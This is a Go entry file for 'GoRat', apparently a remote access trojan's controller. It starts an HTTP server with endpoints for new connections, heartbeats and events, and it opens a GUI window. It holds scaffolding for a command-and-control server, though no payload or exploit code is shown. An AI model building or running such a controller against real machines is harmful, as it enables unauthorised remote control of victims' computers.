package main

import (
	"fmt"
	"net/http"
	"time"

	"github.com/NotKatsu/GoRat/modules/database"
	"github.com/NotKatsu/GoRat/modules/endpoints"
	"github.com/NotKatsu/GoRat/modules/gui/windows"
	"github.com/pterm/pterm"

	go_rat "github.com/AllenDang/giu"
)

func APIHandler() {
	http.HandleFunc("/connection/new", endpoints.ConnectionNew)
	http.HandleFunc("/connection/heartbeat", endpoints.ConnectionHeartbeat)
	http.HandleFunc("/events/get", endpoints.EventsGet)

	err := http.ListenAndServe(":8080", nil)

	if err != nil {
		pterm.Fatal.WithFatal(true).Println(err)
	}
}

func GUIHandler() {
	window := go_rat.NewMasterWindow(fmt.Sprintf("GoRat - Started at %v", time.Now().Format("15:04:05 (2006-01-02)")), 950, 550, go_rat.MasterWindowFlagsNotResizable)
	window.Run(windows.MainWindow)
}

func main() {
	if database.CreateTables() {
		go APIHandler()
		GUIHandler()

	} else {
		pterm.Fatal.WithFatal(true).Println("There was an error when the database tables were trying to be created.")
	}
}